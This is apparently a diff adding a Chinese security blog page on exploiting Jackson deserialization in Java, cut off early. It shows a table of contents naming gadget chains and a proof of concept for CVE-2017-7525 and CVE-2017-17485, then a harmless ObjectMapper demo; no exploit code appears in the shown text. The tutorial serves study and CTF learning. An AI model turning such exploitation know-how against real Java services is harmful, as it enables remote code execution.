@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script>
+  (function () {
+    var OriginTitle = document.title;
+    var titleTime;
+    document.addEventListener('visibilitychange', function () {
+      if (document.hidden) {
+        document.title = '坏人！看完了就想走' + OriginTitle;
+        clearTimeout(titleTime);
+      } else {
+        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
+        titleTime = setTimeout(function () {
+          document.title = OriginTitle;
+        }, 2000);
+      }
+    });
+  })();
+</script>
+
+    <meta name="description" content="懵懵懂懂">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化之Jackson反序列化">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/12/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="懵懵懂懂">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251205191402923.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251205195713048.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251205195835585.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251205201059476.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251205201157233.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206164412686.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206164459610.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206165047687.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206173431967.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206174557732.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206174959993.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206175324839.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206180217853.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206181701494.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206182118166.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206182803426.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206183214392.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206184536612.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206185138947.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206195404347.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206200722360.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206200812547.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206201634949.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206203552203.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206203945056.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PolarCTF-web/image-20251206205411321.png">
+<meta property="article:published_time" content="2025-12-05T10:04:39.000Z">
+<meta property="article:modified_time" content="2025-12-06T12:54:29.363Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="java反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251205191402923.png">
+
+
+<link rel="canonical" href="https://wanth3f1ag.top/2025/12/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2025/12/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","path":"2025/12/05/Java反序列化之Jackson反序列化/","title":"Java反序列化之Jackson反序列化"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Java反序列化之Jackson反序列化 | root@wanth3f1ag</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">root@wanth3f1ag</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTFer</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Jackson%E5%B8%B8%E7%94%A8%E7%9A%84%E4%B8%89%E4%B8%AA%E7%B1%BB"><span class="nav-number">1.</span> <span class="nav-text">Jackson常用的三个类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ObjectMapper"><span class="nav-number">1.1.</span> <span class="nav-text">ObjectMapper</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JsonParser"><span class="nav-number">1.2.</span> <span class="nav-text">JsonParser</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JsonGenerator"><span class="nav-number">1.3.</span> <span class="nav-text">JsonGenerator</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Java%E5%A4%9A%E6%80%81"><span class="nav-number">2.</span> <span class="nav-text">Java多态</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%9A%E6%80%81%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3"><span class="nav-number">3.</span> <span class="nav-text">多态问题的解决</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DefaultTyping"><span class="nav-number">3.1.</span> <span class="nav-text">DefaultTyping</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JAVA-LANG-OBJECT"><span class="nav-number">3.1.1.</span> <span class="nav-text">JAVA_LANG_OBJECT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OBJECT-AND-NON-CONCRETE"><span class="nav-number">3.1.2.</span> <span class="nav-text">OBJECT_AND_NON_CONCRETE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NON-CONCRETE-AND-ARRAYS"><span class="nav-number">3.1.3.</span> <span class="nav-text">NON_CONCRETE_AND_ARRAYS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NON-FINAL"><span class="nav-number">3.1.4.</span> <span class="nav-text">NON_FINAL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B"><span class="nav-number">3.1.5.</span> <span class="nav-text">总结一下</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EVERYTHING"><span class="nav-number">3.1.6.</span> <span class="nav-text">EVERYTHING</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JsonTypeInfo%E6%B3%A8%E8%A7%A3"><span class="nav-number">3.2.</span> <span class="nav-text">@JsonTypeInfo注解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JsonTypeInfo-Id-NONE"><span class="nav-number">3.2.1.</span> <span class="nav-text">JsonTypeInfo.Id.NONE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JsonTypeInfo-Id-CLASS"><span class="nav-number">3.2.2.</span> <span class="nav-text">JsonTypeInfo.Id.CLASS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JsonTypeInfo-Id-MINIMAL-CLASS"><span class="nav-number">3.2.3.</span> <span class="nav-text">JsonTypeInfo.Id.MINIMAL_CLASS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JsonTypeInfo-Id-NAME"><span class="nav-number">3.2.4.</span> <span class="nav-text">JsonTypeInfo.Id.NAME</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JsonTypeInfo-Id-COSTOM"><span class="nav-number">3.2.5.</span> <span class="nav-text">JsonTypeInfo.Id.COSTOM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JsonTypeInfo-Id-DEDUCTION"><span class="nav-number">3.2.6.</span> <span class="nav-text">JsonTypeInfo.Id.DEDUCTION</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%80%E7%BB%88%E5%BE%97%E5%88%B0%E7%9A%84%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">3.3.</span> <span class="nav-text">最终得到的利用条件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91setter"><span class="nav-number">4.</span> <span class="nav-text">Jackson反序列化如何触发setter</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E6%A0%88"><span class="nav-number">4.1.</span> <span class="nav-text">反序列化调用栈</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">5.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-number">6.</span> <span class="nav-text">利用链</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2017-7525%EF%BC%88%E5%9F%BA%E4%BA%8ETemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89"><span class="nav-number">6.1.</span> <span class="nav-text">CVE-2017-7525（基于TemplatesImpl利用链）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">6.1.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%9D%E8%B5%96"><span class="nav-number">6.1.2.</span> <span class="nav-text">依赖</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%93%BE%E5%AD%90%E5%AF%BB%E6%89%BE"><span class="nav-number">6.1.3.</span> <span class="nav-text">链子寻找</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%80%E7%BB%88POC"><span class="nav-number">6.1.4.</span> <span class="nav-text">最终POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E8%A1%A5%E4%B8%81"><span class="nav-number">6.1.5.</span> <span class="nav-text">修复补丁</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2017-17485%EF%BC%88%E5%9F%BA%E4%BA%8EClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89"><span class="nav-number">6.2.</span> <span class="nav-text">CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="nav-number">6.2.1.</span> <span class="nav-text">影响版本</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">wanTh3flag</p>
+  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">166</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">121</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2025/12/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="wanTh3flag">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="root@wanth3f1ag">
+      <meta itemprop="description" content="一条有梦想的咸鱼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Java反序列化之Jackson反序列化 | root@wanth3f1ag">
+      <meta itemprop="description" content="懵懵懂懂">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java反序列化之Jackson反序列化
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-12-05 18:04:39" itemprop="dateCreated datePublished" datetime="2025-12-05T18:04:39+08:00">2025-12-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-12-06 20:54:29" itemprop="dateModified" datetime="2025-12-06T20:54:29+08:00">2025-12-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/javasec/" itemprop="url" rel="index"><span itemprop="name">javasec</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>29k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>26 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">懵懵懂懂</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>J</p>
+<p>Jackson 是当前 Java 生态中最流行的，用来序列化和反序列化 json 的 Java 的开源框架，因其高性能、低内存占用及灵活的扩展性而被选为 Spring MVC 的默认解析器，在处理大文件时速度显著优于 Gson。</p>
+<p>Jackson的核心模块由三个部分组成：</p>
+<ul>
+<li>jackson-core：核心包，提供基于”流模式”解析的相关 API，它包括 JsonPaser 和 JsonGenerator。 </li>
+<li>jackson-annotations，注解包，提供标准注解功能；</li>
+<li>jackson-databind ，数据绑定包， 基于前两者实现了基于”对象绑定” 解析的相关 API （ ObjectMapper ） 和”树模型” 解析的相关 API （JsonNode）</li>
+</ul>
+<h1 id="Jackson常用的三个类"><a href="#Jackson常用的三个类" class="headerlink" title="Jackson常用的三个类"></a>Jackson常用的三个类</h1><h2 id="ObjectMapper"><a href="#ObjectMapper" class="headerlink" title="ObjectMapper"></a>ObjectMapper</h2><p>Jackson 最常用的 API 就是基于”对象绑定” 的 ObjectMapper：</p>
+<ul>
+<li><p>JSON反序列化：ObjectMapper 可以从字符串、流或文件中解析 JSON，并创建表示已解析的 JSON 的 Java 对象。将JSON解析成java对象也被称为JSON反序列化Java对象。</p>
+</li>
+<li><p>JSON序列化：ObjectMapper 可以从Java对象生成JSON。从Java对象生成JSON也被称为将Java对象序列成JSON。</p>
+</li>
+<li><p>Object 映射器可以将 JSON 解析为自定义的类的对象，也可以解析置 JSON 树模型的对象</p>
+</li>
+</ul>
+<p>举个例子，还是用之前的User类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.JacksonNativeSer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了无参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String username, String password)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了有参构造方法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了 getUsername 方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了 setUsername 方法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了 getPassword 方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了 setPassword 方法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后用ObjectMapper 进行序列化和反序列化</p>
+<p>将Java对象序列化成JSON：</p>
+<ul>
+<li>writeValue()</li>
+<li>writeValueAsString()</li>
+<li>writeValueAsBytes()</li>
+</ul>
+<p>将JSON反序列化成Java对象：</p>
+<ul>
+<li>readValue()</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeChains.JacksonNativeSer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setUsername(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        user.setPassword(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;----------序列化操作开始----------&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(user);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------反序列化操作开始----------&quot;</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> mapper.readValue(json, User.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">调用了无参构造方法</span></span><br><span class="line"><span class="comment">调用了 setUsername 方法</span></span><br><span class="line"><span class="comment">调用了 setPassword 方法</span></span><br><span class="line"><span class="comment">----------序列化操作开始----------</span></span><br><span class="line"><span class="comment">调用了 getUsername 方法</span></span><br><span class="line"><span class="comment">调用了 getPassword 方法</span></span><br><span 